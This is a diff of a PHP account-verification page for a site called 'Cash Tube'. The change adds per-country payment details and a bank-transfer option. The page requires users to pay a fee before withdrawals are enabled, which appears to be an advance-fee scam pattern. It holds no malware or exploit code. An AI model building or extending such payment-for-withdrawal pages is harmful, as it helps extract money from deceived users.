@@ -11,9 +11,9 @@ if (!isset($_SESSION['user_id'])) {
     exit;
 }
 
-// Fetch user verification status and details
+// Fetch user verification status, details, and country
 try {
-    $stmt = $pdo->prepare("SELECT name, email, verification_status FROM users WHERE id = ?");
+    $stmt = $pdo->prepare("SELECT name, email, verification_status, country FROM users WHERE id = ?");
     $stmt->execute([$_SESSION['user_id']]);
     $user = $stmt->fetch(PDO::FETCH_ASSOC);
     if (!$user) {
@@ -24,30 +24,55 @@ try {
     $username = htmlspecialchars($user['name']);
     $email = htmlspecialchars($user['email']);
     $verification_status = $user['verification_status'];
+    $user_country = htmlspecialchars($user['country']);
 } catch (PDOException $e) {
     error_log('Database error: ' . $e->getMessage(), 3, '../debug.log');
     header('Location: ../signin.php?error=database');
     exit;
 }
 
-// Fetch dynamic amount and wallet address from region_settings
+// Fetch dynamic verification settings from region_settings based on user's country
 try {
-    $stmt = $pdo->prepare("SELECT amount, wallet_address FROM region_settings LIMIT 1");
-    $stmt->execute();
+    $stmt = $pdo->prepare("
+        SELECT verify_ch, vc_value, verify_ch_name, verify_ch_value, vcn_value, vcv_value, verify_currency, verify_amount
+        FROM region_settings 
+        WHERE country = ?
+    ");
+    $stmt->execute([$user_country]);
     $settings = $stmt->fetch(PDO::FETCH_ASSOC);
+    
     if (!$settings) {
-        $error = 'Settings not found. Please contact support.';
-        $amount = 0.00;
-        $wallet_address = '';
+        $error = 'Verification settings not found for your country. Please contact support.';
+        $verify_ch = 'Crypto';
+        $vc_value = 'USD';
+        $verify_ch_name = 'Payment Method';
+        $verify_ch_value = 'Payment Destination';
+        $vcn_value = 'Network';
+        $vcv_value = 'Network Address';
+        $verify_currency = 'USD';
+        $verify_amount = 0.00;
+        error_log('No region settings found for country: ' . $user_country, 3, '../debug.log');
     } else {
-        $amount = floatval($settings['amount']);
-        $wallet_address = htmlspecialchars($settings['wallet_address']);
+        $verify_ch = htmlspecialchars($settings['verify_ch'] ?: 'Crypto');
+        $vc_value = htmlspecialchars($settings['vc_value'] ?: 'USD');
+        $verify_ch_name = htmlspecialchars($settings['verify_ch_name'] ?: 'Payment Method');
+        $verify_ch_value = htmlspecialchars($settings['verify_ch_value'] ?: 'Payment Destination');
+        $vcn_value = htmlspecialchars($settings['vcn_value'] ?: 'Network');
+        $vcv_value = htmlspecialchars($settings['vcv_value'] ?: 'Network Address');
+        $verify_currency = htmlspecialchars($settings['verify_currency'] ?: 'USD');
+        $verify_amount = floatval($settings['verify_amount'] ?: 0.00);
     }
 } catch (PDOException $e) {
     error_log('Settings fetch error: ' . $e->getMessage(), 3, '../debug.log');
     $error = 'Failed to load verification settings. Please try again later.';
-    $amount = 0.00;
-    $wallet_address = '';
+    $verify_ch = 'Crypto';
+    $vc_value = 'USD';
+    $verify_ch_name = 'Payment Method';
+    $verify_ch_value = 'Payment Destination';
+    $vcn_value = 'Network';
+    $vcv_value = 'Network Address';
+    $verify_currency = 'USD';
+    $verify_amount = 0.00;
 }
 
 // Handle form submission
@@ -85,10 +110,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
                     // Insert into verification_requests table
                     $stmt = $pdo->prepare("
-                        INSERT INTO verification_requests (user_id, payment_amount, name, email, upload_path, file_name, status)
-                        VALUES (?, ?, ?, ?, ?, ?, 'pending')
+                        INSERT INTO verification_requests (user_id, payment_amount, name, email, upload_path, file_name, status, payment_method, currency)
+                        VALUES (?, ?, ?, ?, ?, ?, 'pending', ?, ?)
                     ");
-                    $stmt->execute([$_SESSION['user_id'], $amount, $username, $email, $upload_path, $file_name]);
+                    $stmt->execute([$_SESSION['user_id'], $verify_amount, $username, $email, $upload_path, $file_name, $verify_ch, $verify_currency]);
 
                     // Commit transaction
                     $pdo->commit();
@@ -118,7 +143,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="description" content="Verify your Cash Tube account to enable withdrawals." />
-    <meta name="keywords" content="Cash Tube, verify account, cryptocurrency" />
+    <meta name="keywords" content="Cash Tube, verify account, cryptocurrency, bank transfer" />
     <meta name="author" content="Cash Tube" />
     <title>Verify Account | Cash Tube</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
@@ -476,16 +501,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     <p class="error"><?php echo htmlspecialchars($error); ?></p>
                 <?php endif; ?>
                 <div class="instructions">
-                    <p>To verify your account, please make a payment of <strong>$<?php echo number_format($amount, 2); ?></strong> to the following wallet address:</p>
-                    <p><strong>Wallet Address:</strong> <?php echo $wallet_address; ?></p>
-                    <p>After making the payment, upload a screenshot or proof of payment below. Your request will be reviewed, and your account status will be updated to pending.</p>
+                    <p>To verify your account, please make a payment of <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong> via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> using the following details:</p>
+                    <p><strong><?php echo htmlspecialchars($verify_ch_name); ?>:</strong> <?php echo htmlspecialchars($vc_value); ?> (<?php echo htmlspecialchars($vcn_value); ?>)</p>
+                    <p><strong><?php echo htmlspecialchars($verify_ch_value); ?>:</strong> <?php echo htmlspecialchars($vcv_value); ?></p>
+                    <p>After completing the payment, upload a screenshot or proof of payment below. Your request will be reviewed, and your account status will be updated to pending within 48 hours.</p>
                     <p><strong>Important:</strong></p>
                     <ul>
-                        <li>Ensure the payment is made from your wallet.</li>
-                        <li>Use the exact amount specified ($<?php echo number_format($amount, 2); ?>).</li>
+                        <li>Ensure the payment is made via the specified <strong><?php echo htmlspecialchars($verify_ch); ?></strong>.</li>
+                        <li>Use the exact amount and currency: <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong>.</li>
+                        <li>Include the correct <strong><?php echo htmlspecialchars($vcn_value); ?> (<?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
                         <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender, receiver, amount, timestamp).</li>
                         <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
-                        <li>Verification may take up to 48 hours.</li>
+                        <li>Verification may take up to 48 hours to process.</li>
                     </ul>
                 </div>
                 <form action="verify_account.php" method="POST" enctype="multipart/form-data">
